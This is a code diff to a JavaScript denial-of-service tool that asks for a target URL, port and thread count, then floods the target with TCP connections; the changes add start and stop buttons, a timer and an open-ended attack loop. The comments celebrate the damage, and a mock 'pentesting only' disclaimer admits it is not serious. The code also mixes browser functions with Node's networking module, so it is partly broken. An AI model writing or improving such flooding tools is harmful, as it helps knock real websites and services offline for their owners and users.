@@ -8,12 +8,20 @@
 // ******************************************************************************
 
 // Configuration - Let's fuck things up!
-const targetURL = prompt("Enter target URL (including http/https/onion):");
-const targetHost = new URL(targetURL).hostname;
+let targetURL = prompt("Enter target URL (including http/https/onion):");
+let targetHost;
+try {
+    targetURL = new URL(targetURL);
+    targetHost = targetURL.hostname;
+} catch (error) {
+    alert("Invalid URL! You fucked it up!");
+    window.close();
+}
 const port = parseInt(prompt("Enter target port (e.g., 80, 443, 8080):"));
 const threads = parseInt(prompt("Enter number of threads (crank it up to 666!):"));
 const duration = parseInt(prompt("Enter duration in seconds (let's go long term - FOREVER!):"));
 const logFile = "ddos_fuck_log.txt"; // Log file name - keep track of the carnage
+let isRunning = false; // Track attack status
 
 // Colors (ANSI escape codes) - Make it look badass!
 const darkGreen = "\x1b[32m";
@@ -21,6 +29,34 @@ const purple = "\x1b[35m";
 const darkRed = "\x1b[31m";
 const darkBlue = "\x1b[34m";
 const resetColor = "\x1b[0m";
+
+// Get elements for start, stop, and timer
+const startButton = document.createElement('button');
+startButton.textContent = 'Start Attack';
+startButton.style.backgroundColor = 'darkgreen';
+startButton.style.color = 'white';
+startButton.style.padding = '10px';
+startButton.style.margin = '5px';
+document.body.appendChild(startButton);
+
+const stopButton = document.createElement('button');
+stopButton.textContent = 'Stop Attack';
+stopButton.style.backgroundColor = 'darkred';
+stopButton.style.color = 'white';
+stopButton.style.padding = '10px';
+stopButton.style.margin = '5px';
+stopButton.disabled = true; // Initially disabled
+document.body.appendChild(stopButton);
+
+const timerDisplay = document.createElement('div');
+timerDisplay.textContent = 'Attack Duration: 0 seconds';
+timerDisplay.style.color = 'white';
+timerDisplay.style.fontFamily = 'monospace';
+timerDisplay.style.margin = '5px';
+document.body.appendChild(timerDisplay);
+
+let startTime;
+let timerInterval;
 
 // Logging function - gotta record the destruction!
 function log(message) {
@@ -40,11 +76,10 @@ function log(message) {
 async function tcpFlood(threadId) {
     const net = require('net');
     const crypto = require('crypto'); // For more randomness and obfuscation!
-    const startTime = Date.now();
 
     log(`${purple}[THREAD ${threadId}] Starting TCP flood against ${targetHost}:${port}${resetColor}`);
 
-    while (Date.now() - startTime < duration * 1000) {
+    while (isRunning) {
         try {
             const socket = net.createConnection({ host: targetHost, port: port }, () => {
                 log(`${darkBlue}[THREAD ${threadId}] Connected to ${targetHost}:${port}${resetColor}`);
@@ -89,23 +124,42 @@ async function tcpFlood(threadId) {
     log(`${purple}[THREAD ${threadId}] TCP flood finished${resetColor}`);
 }
 
+// Timer Function
+function updateTimer() {
+    const elapsedTime = Math.floor((Date.now() - startTime) / 1000);
+    timerDisplay.textContent = `Attack Duration: ${elapsedTime} seconds`;
+}
+
 // Main execution - let's get this party started!
 async function main() {
-    log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads for ${duration} seconds - FUCK YEAH!${resetColor}`);
+    log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
+    isRunning = true;
+    startTime = Date.now();
+    timerInterval = setInterval(updateTimer, 1000);
 
     for (let i = 0; i < threads; i++) {
         tcpFlood(i + 1);
     }
-
-    setTimeout(() => {
-        log(`${darkGreen}[MAIN] Attack completed. Check ${logFile} for details. - Time for a beer and some goddamn mayhem!${resetColor}`);
-        process.exit(0);
-    }, duration * 1000);
 }
+
+// Add event listeners to buttons
+startButton.addEventListener('click', () => {
+    startButton.disabled = true;
+    stopButton.disabled = false;
+    main();
+});
+
+stopButton.addEventListener('click', () => {
+    isRunning = false;
+    clearInterval(timerInterval);
+    startButton.disabled = false;
+    stopButton.disabled = true;
+    log(`${darkGreen}[MAIN] Attack stopped manually.${resetColor}`);
+});
 
 // Explicit user consent required - just to cover our asses (sort of)
 if (confirm("WARNING: This tool is for PENTESTING purposes ONLY. Unauthorized use is ILLEGAL and will probably land your ass in jail. Noodles Inc. is NOT responsible for any misuse. We're not even a real company. Do you agree to proceed and accept the consequences like a FUCKING MAN? (LOL)")) {
-    main();
+    // Do nothing here; the start button triggers the attack
 } else {
     window.close(); // Close the window if the user does not agree
 }
